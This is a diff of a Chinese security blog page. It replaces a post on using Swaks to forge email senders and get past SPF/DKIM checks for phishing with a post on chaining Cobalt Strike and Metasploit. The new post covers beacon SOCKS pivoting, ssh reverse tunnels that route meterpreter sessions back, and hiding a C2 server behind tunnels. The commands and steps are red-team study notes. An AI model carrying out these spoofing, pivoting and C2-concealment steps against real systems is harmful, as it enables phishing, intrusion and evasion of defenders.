@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Smtp,">
+  <meta name="keywords" content="CobaltStrike,MetaSploit,内网穿透,">
 
 
 
@@ -81,21 +81,26 @@
 
 
 
-<meta name="description" content="Swaks简介 Swaks的主要设计目标是成为一个灵活的，可编写脚本的，面向对象的SMTP测试工具。它处理SMTP功能和扩展，如TLS，身份验证和流水线操作; 多种版本的SMTP协议，包括SMTP， ESMTP和LMTP ; 和多种传输方法，包括unix-domain套接字，internet-domain套接字和生成进程的管道。可以在环境变量，配置文件和命令行中指定选项，从而为操作员和脚本编写者提">
-<meta name="keywords" content="Smtp">
+<meta name="description" content="CobaltStrike+MetaSploit联动攻击** 本文源于klion红队攻防揭秘  观后复现 ** 重点 1，通过beacon内置socks，将msf带入目标内网2，使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf3，使用msf的exp直接弹回一个beacon4，灵活使用ssh隧道深度隐藏C2  通过beacon内置socks，将msf带入目标内网** CS **">
+<meta name="keywords" content="CobaltStrike,MetaSploit,内网穿透">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Swaks简介">
-<meta property="og:url" content="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/index.html">
+<meta property="og:title" content="CobaltStrike+MetaSploit联动攻击">
+<meta property="og:url" content="https://github.com/scareing/scareing.github.io/2019/08/29/CobaltStrike+MetaSploit联动技巧/index.html">
 <meta property="og:site_name" content="scareing的学习笔记">
-<meta property="og:description" content="Swaks简介 Swaks的主要设计目标是成为一个灵活的，可编写脚本的，面向对象的SMTP测试工具。它处理SMTP功能和扩展，如TLS，身份验证和流水线操作; 多种版本的SMTP协议，包括SMTP， ESMTP和LMTP ; 和多种传输方法，包括unix-domain套接字，internet-domain套接字和生成进程的管道。可以在环境变量，配置文件和命令行中指定选项，从而为操作员和脚本编写者提">
+<meta property="og:description" content="CobaltStrike+MetaSploit联动攻击** 本文源于klion红队攻防揭秘  观后复现 ** 重点 1，通过beacon内置socks，将msf带入目标内网2，使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf3，使用msf的exp直接弹回一个beacon4，灵活使用ssh隧道深度隐藏C2  通过beacon内置socks，将msf带入目标内网** CS **">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/25/%E4%BD%BF%E7%94%A8Swaks%E5%AF%B9%E9%82%AE%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%85%A5%E5%AE%9A%E5%88%B6/2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/25/%E4%BD%BF%E7%94%A8Swaks%E5%AF%B9%E9%82%AE%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%85%A5%E5%AE%9A%E5%88%B6/1.png">
-<meta property="og:updated_time" content="2019-10-04T08:28:29.443Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/cs&msf.png">
+<meta property="og:updated_time" content="2019-11-23T14:35:43.836Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Swaks简介">
-<meta name="twitter:description" content="Swaks简介 Swaks的主要设计目标是成为一个灵活的，可编写脚本的，面向对象的SMTP测试工具。它处理SMTP功能和扩展，如TLS，身份验证和流水线操作; 多种版本的SMTP协议，包括SMTP， ESMTP和LMTP ; 和多种传输方法，包括unix-domain套接字，internet-domain套接字和生成进程的管道。可以在环境变量，配置文件和命令行中指定选项，从而为操作员和脚本编写者提">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/25/%E4%BD%BF%E7%94%A8Swaks%E5%AF%B9%E9%82%AE%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%85%A5%E5%AE%9A%E5%88%B6/2.png">
+<meta name="twitter:title" content="CobaltStrike+MetaSploit联动攻击">
+<meta name="twitter:description" content="CobaltStrike+MetaSploit联动攻击** 本文源于klion红队攻防揭秘  观后复现 ** 重点 1，通过beacon内置socks，将msf带入目标内网2，使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf3，使用msf的exp直接弹回一个beacon4，灵活使用ssh隧道深度隐藏C2  通过beacon内置socks，将msf带入目标内网** CS **">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/5.png">
 
 
 
@@ -125,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
+  <link rel="canonical" href="https://github.com/scareing/scareing.github.io/2019/08/29/CobaltStrike+MetaSploit联动技巧/">
 
 
 
 
 
-  <title>Swaks简介 | scareing的学习笔记</title>
+  <title>CobaltStrike+MetaSploit联动攻击 | scareing的学习笔记</title>
   
 
 
@@ -268,7 +273,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/29/CobaltStrike+MetaSploit联动技巧/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="scareing">
@@ -285,7 +290,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Swaks简介</h1>
+          <h1 class="post-title" itemprop="name headline">CobaltStrike+MetaSploit联动攻击</h1>
         
 
         <div class="post-meta">
@@ -297,8 +302,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-29T12:12:57+08:00">
+                2019-08-29
               </time>
             
 
@@ -320,8 +325,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/社会工程学/" itemprop="url" rel="index">
-                    <span itemprop="name">社会工程学</span>
+                  <a href="/categories/渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透</span>
                   </a>
                 </span>
 
@@ -357,39 +362,41 @@
       
 
       
-        <h1 id="Swaks简介"><a href="#Swaks简介" class="headerlink" title="Swaks简介"></a>Swaks简介</h1><blockquote>
-<p><strong>Swaks</strong>的主要设计目标是成为一个灵活的，可编写脚本的，面向对象的SMTP测试工具。它处理SMTP功能和扩展，如TLS，身份验证和流水线操作; 多种版本的SMTP协议，包括SMTP， ESMTP和LMTP ; 和多种传输方法，包括unix-domain套接字，internet-domain套接字和生成进程的管道。可以在环境变量，配置文件和命令行中指定选项，从而为操作员和脚本编写者提供最大的可配置性和易用性。</p>
+        <h1 id="CobaltStrike-MetaSploit联动攻击"><a href="#CobaltStrike-MetaSploit联动攻击" class="headerlink" title="CobaltStrike+MetaSploit联动攻击"></a>CobaltStrike+MetaSploit联动攻击</h1><p>** 本文源于klion红队攻防揭秘  观后复现 **</p>
+<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><blockquote>
+<p>1，通过beacon内置socks，将msf带入目标内网<br>2，使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf<br>3，使用msf的exp直接弹回一个beacon<br>4，灵活使用ssh隧道深度隐藏C2</p>
 </blockquote>
-<p>Swaks也被称为SMTP协议的瑞士军刀，它可以灵活的操作SMTP协议报文，它通常被用来伪造邮件，进行钓鱼、社工等操作。并且可以绕过常规的基于SPF与DKIM的垃圾邮箱检测。Kali已预装Swaks</p>
-<h2 id="基本参数说明"><a href="#基本参数说明" class="headerlink" title="基本参数说明"></a>基本参数说明</h2><blockquote>
-<p>swaks –to <a href="mailto:test@qq.com" target="_blank" rel="noopener">test@qq.com</a>     //首先测试邮箱的连通性；</p>
-<blockquote>
+<h2 id="通过beacon内置socks，将msf带入目标内网"><a href="#通过beacon内置socks，将msf带入目标内网" class="headerlink" title="通过beacon内置socks，将msf带入目标内网"></a>通过beacon内置socks，将msf带入目标内网</h2><p>** CS **</p>
 <ul>
-<li>–to  <a href="mailto:test@gmail.com" target="_blank" rel="noopener">test@gmail.com</a>      //接件人邮箱；</li>
-<li>–from  <a href="mailto:test@qq.com" target="_blank" rel="noopener">test@qq.com</a>     //发件人邮箱；</li>
-<li>–ehlo  qq.com     //伪造邮件ehlo头，即是发件人邮箱的域名。提供身份认证；</li>
-<li>–server  mail.smtp2go.com     //服务邮件域</li>
-<li>–body  “test”    //引号中的内容即为邮件正文，可直接引用文件；</li>
-<li>–data  ./Desktop/email.txt    //将正常源邮件的内容保存成TXT文件，再作为正常邮件发送；</li>
-<li>–header  “Subject:标题”     //邮件标题;</li>
-<li>–header-X-Mailer  gmail.com     //X-Mailer标头表示用于起草和发送原始电子邮件的程序</li>
-<li>–h-From:  ‘boss <a href="mailto:admin@gmail.com" target="_blank" rel="noopener">admin@gmail.com</a>‘     //伪造的发件人邮箱；</li>
-<li>–attach /root/test.txt     //附件</li>
+<li>beacon&gt; getuid</li>
+<li>beacon&gt; socks 1080<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/5.png" alt="avatar"></li>
+<li><ul>
+<li>msf **</li>
 </ul>
-</blockquote>
-</blockquote>
-<h2 id="SPF验证原理"><a href="#SPF验证原理" class="headerlink" title="SPF验证原理"></a>SPF验证原理</h2><blockquote>
-<p>SPF是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。<br>按照SPF的格式在DNS记录中增加一条TXT类型的记录，将提高该域名的信誉度，同时可以防止垃圾邮件伪造该域的发件人发送垃圾邮件。<br>SPF是跟DNS相关的一项技术，它的内容写在DNS的txt类型的记录里面。mx记录的作用是给寄信者指明某个域名的邮件服务器有哪些。SPF的作用跟mx相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的。<br>由定义可以看出，SPF的作用主要是反垃圾邮件，主要针对那些发信人伪造域名的垃圾邮件。</p>
-</blockquote>
-<p>如果mail.smtp2go.com是真正的邮件服务器，那么Gmail的服务器收到的源IP也肯定是mail.smtp2go.com的IP。Gmail中会校验邮件发送者的IP是否存在于smtp.from的域名SPF配置列表里,但是邮件显示的是from头中的域而不是服务邮件域，因此可以将服务邮件域设置为正常的邮件服务器地址，伪造一个Mail.From即可。</p>
-<h2 id="DKIM工作原理"><a href="#DKIM工作原理" class="headerlink" title="DKIM工作原理"></a>DKIM工作原理</h2><blockquote>
-<p>DKIM 的基本工作原理同样是基于传统的密钥认证方式，他会产生两组钥匙，公钥(public key)和私钥(private key)，公钥将会存放在 DNS 中，而私钥会存放在寄信服务器中。数字签名会自动产生，并依附在邮件头中，发送到寄信者的服务器里。公钥则放在DNS服务器上，供自动获得。收信的服务器，将会收到夹带在邮件头中的签名和在DNS上自己获取公钥，然后进行比对，比较寄信者的域名是否合法，如果不合法，则判定为垃圾邮件。</p>
-</blockquote>
-<p>但是这里由于使用了第三方邮件服务器,公钥和私钥已经提供了.</p>
-<h3 id="实际效果"><a href="#实际效果" class="headerlink" title="实际效果"></a>实际效果</h3><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/25/%E4%BD%BF%E7%94%A8Swaks%E5%AF%B9%E9%82%AE%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%85%A5%E5%AE%9A%E5%88%B6/2.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/25/%E4%BD%BF%E7%94%A8Swaks%E5%AF%B9%E9%82%AE%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%85%A5%E5%AE%9A%E5%88%B6/1.png" alt="avatar"></p>
-<ul>
-<li><strong>总结：SPF和DKIM已经pass了，DMARC这东西不清楚是什么，但是暂时不影响邮件的正常接收。<br>在测试过程中发现，伪造gmail域时不能发给gmail域，只能伪造为其他域的邮件发送，比如163.com,qq.com。整体来说，电脑上查看就比正常邮件多了个通过xxx代发，又因为手机上信息显示不全，手机查看几乎无破绽，所以欺骗性还是非常强的</strong></li>
+</li>
+<li>msf5 &gt; setg Proxies socks4:XXX.XXX.XXX.XXX:1080  //设置代理</li>
+<li>msf5 &gt; setg ReversseAllowProxy true  //双向通道</li>
 </ul>
+<p>现在就可以直接用msf的auxiliary模块扫描目标内网了<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/3.png" alt="avatar"></p>
+<h2 id="使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf"><a href="#使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf" class="headerlink" title="使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf **"></a>使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf **</h2><p><strong>* 首先创建CS外部tcp监听器 *</strong><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/4.png" alt="avatar"><br><strong>* 然后到本地机器msf创建tcp监听器 *</strong><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/8.png" alt="avatar"><br><strong>* 随后，在vps机器上编辑sshd配置，开启ssh转发功能，重启ssh服务，这是所有使用ssh隧道转发前的必备操作。 *</strong></p>
+<pre><code># vi/etc/ssh/sshd_config
+AllowTcpForwarding yes
+GatewayPorts yes
+TCPKeepAlive yes
+PasswordAuthentication yes
+# systemctl restartsshd.service</code></pre><p><strong>* 回到本地linux中并通过ssh隧道做好ssh转发，意思就是通过vps把来自外部的8080端口流量全部转到本地linux的8080端口上，而本地linux的8080端口上跑的又正好是msf的监听器，所以，最终才会造成meterpreter本地上线的效果 *</strong></p>
+<pre><code># ssh -C -f -N -g -R 0.0.0.0:8080:192.168.0.108:8080 root@xxx.xxx.xxx.xxx -p 22 //建立ssh隧道
+&gt;  -C     //压缩数据 
+&gt;  -f     //运行在后台
+&gt;  -N     //不远程执行命令，对端口转发很有用
+&gt;  -g     //允许远程主机连接到本地转发端口
+&gt;  -R     //[bind_address:]port:host:hostport  端口及地址配置
+# netstat -tulnp | grep &apos;8080&apos; //检查通道是否成功建立</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/7.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/6.png" alt="avatar"></p>
+<p>   <strong>* 最后，回到cs上选择目标内网指定机器的beacon shell 点击 “Spawn” 派生，再选择刚在上面创建好的tcp的外部监听器，相应目标机器的meterpreter就会被直接弹到本地，也可以选择批量操作 *</strong></p>
+<h2 id="使用msf的exp直接弹回一个beacon"><a href="#使用msf的exp直接弹回一个beacon" class="headerlink" title="使用msf的exp直接弹回一个beacon"></a>使用msf的exp直接弹回一个beacon</h2><p>** 暂时复现失败 ** </p>
+<h2 id="灵活利用ssh隧道深度隐藏C2"><a href="#灵活利用ssh隧道深度隐藏C2" class="headerlink" title="灵活利用ssh隧道深度隐藏C2"></a>灵活利用ssh隧道深度隐藏C2</h2><blockquote>
+<p>首先，创建一个普通的http 反向beacon监听器，并用该监听器生成一个64位的exe payload，随后再立即删除该监听器<br>然后本地开启ssh隧道转发，转发刚刚删除的监听器的端口。<br>本地启动cs服务，监听转发的端口，监听器与删除监听器配置相同。<br>当payload执行，本地服务上线。<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/cs&msf.png" alt="avatar"></p>
+</blockquote>
 
       
     </div>
@@ -415,7 +422,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/" title="Swaks简介">https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/</a>
+    <a href="https://github.com/scareing/scareing.github.io/2019/08/29/CobaltStrike+MetaSploit联动技巧/" title="CobaltStrike+MetaSploit联动攻击">https://github.com/scareing/scareing.github.io/2019/08/29/CobaltStrike+MetaSploit联动技巧/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -430,7 +437,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Smtp/" rel="tag"># Smtp</a>
+            <a href="/tags/CobaltStrike/" rel="tag"># CobaltStrike</a>
+          
+            <a href="/tags/MetaSploit/" rel="tag"># MetaSploit</a>
+          
+            <a href="/tags/内网穿透/" rel="tag"># 内网穿透</a>
           
         </div>
       
@@ -443,14 +454,18 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/08/27/绕过Powershell执行策略执行ps脚本。/" rel="next" title="绕过Powershell执行策略执行ps脚本。">
+                <i class="fa fa-chevron-left"></i> 绕过Powershell执行策略执行ps脚本。
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/26/cmd绕过空格过滤/" rel="prev" title="cmd绕过空格过滤">
-                cmd绕过空格过滤 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/09/10/命令行文件下载的各种姿势/" rel="prev" title="命令行文件下载的各种姿势">
+                命令行文件下载的各种姿势 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -602,7 +617,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Swaks简介"><span class="nav-number">1.</span> <span class="nav-text">Swaks简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本参数说明"><span class="nav-number">1.1.</span> <span class="nav-text">基本参数说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SPF验证原理"><span class="nav-number">1.2.</span> <span class="nav-text">SPF验证原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DKIM工作原理"><span class="nav-number">1.3.</span> <span class="nav-text">DKIM工作原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实际效果"><span class="nav-number">1.3.1.</span> <span class="nav-text">实际效果</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CobaltStrike-MetaSploit联动攻击"><span class="nav-number">1.</span> <span class="nav-text">CobaltStrike+MetaSploit联动攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#重点"><span class="nav-number">1.1.</span> <span class="nav-text">重点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过beacon内置socks，将msf带入目标内网"><span class="nav-number">1.2.</span> <span class="nav-text">通过beacon内置socks，将msf带入目标内网</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf"><span class="nav-number">1.3.</span> <span class="nav-text">使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf **</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用msf的exp直接弹回一个beacon"><span class="nav-number">1.4.</span> <span class="nav-text">使用msf的exp直接弹回一个beacon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#灵活利用ssh隧道深度隐藏C2"><span class="nav-number">1.5.</span> <span class="nav-text">灵活利用ssh隧道深度隐藏C2</span></a></li></ol></li></ol></div>
             
 
           </div>
